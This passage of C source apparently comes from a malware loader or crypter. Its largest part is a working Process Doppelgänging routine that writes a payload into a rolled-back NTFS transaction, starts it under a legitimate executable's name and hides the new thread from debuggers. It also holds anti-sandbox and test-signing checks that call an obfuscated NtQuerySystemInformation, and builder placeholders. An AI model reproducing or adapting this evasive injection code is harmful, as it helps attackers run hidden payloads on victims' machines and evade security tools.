		while(bitpos < 32);
		result = corecount;
	}
	else{
		GetSystemInfo(&sysinf);
		result = sysinf.dwNumberOfProcessors;
	}
	if(result < 2)
	{
jumptoself_ASM();
	}
	else{
		return;
	}
}

typedef struct _SYSTEM_CODEINTEGRITY_INFORMATION
{
    unsigned long Length;
    unsigned long CodeIntegrityOptions;
} SYSTEM_CODEINTEGRITY_INFORMATION, *PSYSTEM_CODEINTEGRITY_INFORMATION;
typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemProcessInformation = 5,
    SystemProcessorPerformanceInformation = 8,
    SystemInterruptInformation = 23,
    SystemExceptionInformation = 33,
    SystemRegistryQuotaInformation = 37,
    SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS ( WINAPI *NQS )( SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG );
void testsigning(void)
{	
	char *libname = "lvfnn,fnn";// ntdll.dll,9,2
	char *funcname = "JpUqav}W}wpaiMjbkviepmkj"; // NtQuerySystemInformation,24,4
	NQS NtQuerySystemInformation  = ( NQS )GetProcAddress( GetModuleHandle( decrypted(libname,9,2)), decrypted(funcname,24,4));
	SYSTEM_CODEINTEGRITY_INFORMATION sci = {0};
	unsigned long dwcbSz = 0;
	sci.Length = sizeof(sci);
	if(NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0x67,&sci,sizeof(sci),&dwcbSz) >= 0 && dwcbSz == sizeof(sci))
	{
    	BOOL bTestsigningEnabled = !!(sci.CodeIntegrityOptions & 0x2); // CODEINTEGRITY_OPTION_TESTSIGN
		if(bTestsigningEnabled)
		{
	jumptoself_ASM();
		}
	}
}
void ProcessDoppelgÃ¤nging(LPWSTR lpTargetApp, LPWSTR lpPayloadApp)
{
	HINSTANCE hinstStub = GetModuleHandle("ntdll.dll");
	if(hinstStub) 
	{
		NtCreateTransaction = (LPNTCREATETRANSACTION)GetProcAddress(hinstStub, "NtCreateTransaction");
		NtAllocateVirtualMemory = (LPNTALLOCATEVIRTUALMEMORY)GetProcAddress(hinstStub, "NtAllocateVirtualMemory");
		NtCreateSection = (LPNTCREATESECTION)GetProcAddress(hinstStub, "NtCreateSection");
		NtRollbackTransaction = (LPNTROLLBACKTRANSACTION)GetProcAddress(hinstStub, "NtRollbackTransaction");
		NtClose = (LPNTCLOSE)GetProcAddress(hinstStub, "NtClose");
		NtCreateProcessEx = (LPNTCREATEPROCESSEX)GetProcAddress(hinstStub, "NtCreateProcessEx");
		NtQueryInformationProcess = (LPNTQUERYINFORMATIONPROCESS)GetProcAddress(hinstStub, "NtQueryInformationProcess");
		NtReadVirtualMemory = (LPNTREADVIRTUALMEMORY)GetProcAddress(hinstStub, "NtReadVirtualMemory");
		NtWriteVirtualMemory = (LPNTWRITEVIRTUALMEMORY)GetProcAddress(hinstStub, "NtWriteVirtualMemory");
		NtCreateThreadEx = (LPNTCREATETHREADEX)GetProcAddress(hinstStub, "NtCreateThreadEx");
		NtFreeVirtualMemory = (LPNTFREEVIRTUALMEMORY)GetProcAddress(hinstStub, "NtFreeVirtualMemory");
		RtlCreateProcessParametersEx = (LPRTLCREATEPROCESSPARAMETERSEX)GetProcAddress(hinstStub, "RtlCreateProcessParametersEx");
		RtlDestroyProcessParameters = (LPRTLDESTROYPROCESSPARAMETERS)GetProcAddress(hinstStub, "RtlDestroyProcessParameters");
		RtlImageNtHeader = (LPRTLIMAGENTHEADER)GetProcAddress(hinstStub, "RtlImageNtHeader");
		RtlInitUnicodeString = (LPRTLINITUNICODESTRING)GetProcAddress(hinstStub, "RtlInitUnicodeString");

	}
	else
	{
		exit(0);
	}
		
	BOOL bCond = FALSE;
    NTSTATUS status;
    HANDLE hTransaction = NULL, hTransactedFile = INVALID_HANDLE_VALUE, hFile = INVALID_HANDLE_VALUE;
    HANDLE hSection = NULL, hProcess = NULL, hThread = NULL;
    LARGE_INTEGER fsz;
    ULONG ReturnLength = 0;
    ULONG_PTR EntryPoint = 0; //, ImageBase = 0;
    PVOID Buffer = NULL, MemoryPtr = NULL;
    SIZE_T sz = 0;
    PEB *Peb;

    PROCESS_BASIC_INFORMATION pbi;

    PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;

    OBJECT_ATTRIBUTES obja;
    UNICODE_STRING    ustr;
 	//RtlInitUnicodeString(&ustr, L"C:\\windows\\system32\\svchost.exe");
	//wchar_t* tempholder = L"";
	//wcstombs(lpTargetApp,tempholder,256);
    RtlInitUnicodeString(&ustr, lpTargetApp);
	//RtlInitUnicodeString(&ustr, L"fuck it"); // find and replace here random string between 8 and 20 chars <-- I'm a god damned moron.

    BYTE temp[0x1000];

    do {
        RtlSecureZeroMemory(&temp, sizeof(temp));
        //
        // Create TmTx transaction object.
        //
        InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);
        status = NtCreateTransaction(&hTransaction,
            TRANSACTION_ALL_ACCESS,
            &obja,
            NULL,
            NULL,
            0,
            0,
            0,
            NULL,
            &ustr);

        if (!NT_SUCCESS(status)) {
            //printf("NtCreateTransaction fail\n");
            break;
        }
        //
        // Open target file for transaction.
        //
        hTransactedFile = CreateFileTransactedW(lpTargetApp,
            GENERIC_WRITE | GENERIC_READ,
            0,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL,
            hTransaction,
            NULL,
            NULL);

        if (hTransactedFile == INVALID_HANDLE_VALUE) {
            //printf("CreateFileTransacted fail with GetLastError: %d\n",GetLastError());
            break;
        }
        //
        // Open file payload.
        //
        hFile = CreateFileW(lpPayloadApp,
            GENERIC_READ,
            0,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
       //     printf("CreateFile(target) failed\n");
            break;
        }
        //
        // Query payload file size.
        //
        if (!GetFileSizeEx(hFile, &fsz)) {
      //      printf("GetFileSizeEx failed\n");
            break;
        }
        //
        // Allocate buffer for payload file.
        //
        Buffer = NULL;
        sz = (SIZE_T)fsz.LowPart;
        status = NtAllocateVirtualMemory(NtCurrentProcess(),
            &Buffer,
            0,
            &sz,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE);

        if (!NT_SUCCESS(status)) {
	//		printf("NtAllocateVirtualMemory failed\n");
            break;
        }

        //
        // Read payload file to the buffer.
        //
        if (!ReadFile(hFile, Buffer, fsz.LowPart, &ReturnLength, NULL)) {
      //      printf("ReadFile failed\n");
            break;
        }

        CloseHandle(hFile);
        hFile = INVALID_HANDLE_VALUE;
        //
        // Write buffer into transaction.
        //
        if (!WriteFile(hTransactedFile, Buffer, fsz.LowPart, &ReturnLength, NULL)) {
      //      printf("WriteFile failed\n");
            break;
        }
        //
        // Create section from transacted file.
        //
        status = NtCreateSection(&hSection,
            SECTION_ALL_ACCESS,
            NULL,
            0,
            PAGE_READONLY,
            SEC_IMAGE,
            hTransactedFile);
        if (!NT_SUCCESS(status)) {
            printf("NtCreateSection(hTransactedFile) failed\n");
            break;
        }

        status = NtRollbackTransaction(hTransaction, TRUE);
        if (!NT_SUCCESS(status)) {
        //    printf("NtRollbackTransaction(hTransaction) failed\n");
            break;
        }

        NtClose(hTransaction);
        hTransaction = NULL;

        CloseHandle(hTransactedFile);
        hTransactedFile = INVALID_HANDLE_VALUE;
        //
        // Create process object with transacted section.
        //
        //
        // Warning: due to MS brilliant coding skills (NULL ptr dereference) 
        //          this call will trigger BSOD on Windows 10 prior to RS3.
        //
        hProcess = NULL;
        status = NtCreateProcessEx(&hProcess,
            GENERIC_ALL,
            NULL,
            GetCurrentProcess(),
            PS_INHERIT_HANDLES,
            hSection,
            NULL,
            NULL,
            FALSE);

        if (!NT_SUCCESS(status)) {
            printf("NtCreateProcessEx(hSection) failed\n"); // fails with 0x4000000E /  STATUS_IMAGE_MACHINE_TYPE_MISMATCH
			// maybe this only works with 64 bit?
			


            break;
        }
        //
        // Query payload file entry point value.
        //
        status = NtQueryInformationProcess(hProcess,
            ProcessBasicInformation,
            &pbi,
            sizeof(PROCESS_BASIC_INFORMATION),
            &ReturnLength);

        if (!NT_SUCCESS(status)) {
        //    printf("NtQueryInformationProcess failed\n");
            break;
        }

        status = NtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &temp, 0x1000, &sz);
        if (!NT_SUCCESS(status)) {
         //   printf("NtReadVirtualMemory failed\n");
            break;
        }

//      EntryPoint = (ULONG_PTR)RtlImageNtHeader(Buffer)->OptionalHeader.AddressOfEntryPoint;
        EntryPoint = (RtlImageNtHeader(Buffer))->OptionalHeader.AddressOfEntryPoint;
		EntryPoint += (ULONG_PTR)((PPEB)temp)->ImageBaseAddress;
        //
        // Create process parameters block.
        //
        //RtlInitUnicodeString(&ustr, L"C:\\windows\\system32\\svchost.exe");
        //RtlInitUnicodeString(&ustr, lpTargetApp);
        status = RtlCreateProcessParametersEx(&ProcessParameters,
            &ustr,
            NULL,
            NULL,
            &ustr,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
            RTL_USER_PROC_PARAMS_NORMALIZED);

        if (!NT_SUCCESS(status)) {
           // printf("RtlCreateProcessParametersEx failed\n");
            break;
        }
        //
        // Allocate memory in target process and write process parameters block.
        //
        sz = ProcessParameters->EnvironmentSize + ProcessParameters->MaximumLength;
        MemoryPtr = ProcessParameters;
        status = NtAllocateVirtualMemory(hProcess,
            &MemoryPtr,
            0,
            &sz,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE);

        if (!NT_SUCCESS(status)) {
           // printf("NtAllocateVirtualMemory(ProcessParameters) failed\n");
            break;
        }
        sz = 0;
        status = NtWriteVirtualMemory(hProcess,
            ProcessParameters,
            ProcessParameters,
            ProcessParameters->EnvironmentSize + ProcessParameters->MaximumLength,
            &sz);

        if (!NT_SUCCESS(status)) {
          //  printf("NtWriteVirtualMemory(ProcessParameters) failed\n");
            break;
        }
        //
        // Update PEB->ProcessParameters pointer to newly allocated block.
        //
        Peb = (PEB *)pbi.PebBaseAddress;
        status = NtWriteVirtualMemory(hProcess,
            &Peb->ProcessParameters,
            &ProcessParameters,
            sizeof(PVOID),
            &sz);
        if (!NT_SUCCESS(status)) {
          //  printf("NtWriteVirtualMemory(Peb->ProcessParameters) failed\n");
            break;
        }
        //
        // Create primary thread.
        //
        hThread = NULL;
		// fuck https://ntquery.wordpress.com/2014/03/29/anti-debug-ntcreatethreadex/#more-11
		// #define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER 0x00000004
        status = NtCreateThreadEx(&hThread,
            THREAD_ALL_ACCESS,
            NULL,
            hProcess,
            (LPTHREAD_START_ROUTINE)EntryPoint,
            NULL,
            0x00000004,
            0,
            0,
            0,
            NULL);
        if (!NT_SUCCESS(status)) {
         //   printf("NtCreateThreadEx(EntryPoint) failed\n");
            break;
        }

    } while (bCond);

    if (hTransaction)
        NtClose(hTransaction);
    if (hSection)
        NtClose(hSection);
    if (hProcess)
        NtClose(hProcess);
    if (hThread)
        NtClose(hThread);
    if (hTransactedFile != INVALID_HANDLE_VALUE)
        CloseHandle(hTransactedFile);
    if (hFile != INVALID_HANDLE_VALUE)
        CloseHandle(hFile);
    if (Buffer != NULL) {
        sz = 0;
        NtFreeVirtualMemory(NtCurrentProcess(), &Buffer, &sz, MEM_RELEASE);
    }
    if (ProcessParameters) {
        RtlDestroyProcessParameters(ProcessParameters);
    }
}

/* possibly use this for verifying sleep took place. Maybe add later.
	LASTINPUTINFO lel;
	lel.cbSize = sizeof(LASTINPUTINFO);
	GetLastInputInfo(&lel);
	int timeout = 7000;
	Sleep(timeout); // sleep method
	DWORD lk = GetTickCount();
	if((lk - lel.dwTime) < timeout + 1000) // 1 min
	{
		// looks like sleep worked.
	}
	else
	{
		// sleep function likely hooked / nulled out, fail!
	}

*/
//replacemeatend0
//replacemeatend1
//replacemeatend2
//replacemeatend3
//replacemeatend4
//replacemeatend5
//replacemeatend6
//replacemeatend7
//replacemeatend8
//replacemeatend9